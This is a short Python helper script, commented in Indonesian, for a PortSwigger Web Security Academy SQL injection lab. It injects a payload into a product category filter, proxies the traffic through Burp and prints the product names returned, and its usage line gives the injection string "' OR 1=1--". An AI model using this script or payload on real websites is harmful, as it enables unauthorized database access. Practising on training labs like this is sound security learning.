import requests
import sys
import urllib3
from bs4 import BeautifulSoup  # Tambahan: Untuk mengekstrak teks HTML

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxy ke Burp Suite (opsional)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def extract_products(url, payload):
    uri = '/filter?category='
    # Mengirim request dengan payload
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    
    if r.status_code == 200:
        # Membaca HTML menggunakan BeautifulSoup
        soup = BeautifulSoup(r.text, 'html.parser')
        
        # Di lab PortSwigger, nama produk biasanya berada di dalam tag <th> atau <h3>
        # Kita akan mencari semua tag <th> (sesuaikan jika struktur lab berbeda)
        products = soup.find_all('h3') 
        
        if products:
            print("[+] Produk yang ditemukan di halaman:")
            for product in products:
                # Mengambil teks bersih dari tag HTML
                print(f"  - {product.text.strip()}")
            return True
        else:
            print("[-] Tidak ada produk yang ditemukan.")
            return False
    else:
        print(f"[-] Request gagal dengan status code: {r.status_code}")
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s https://[LAB-ID].web-security-academy.net "%27+OR+1=1--"' % sys.argv[0])
        sys.exit(-1)

    extract_products(url, payload)
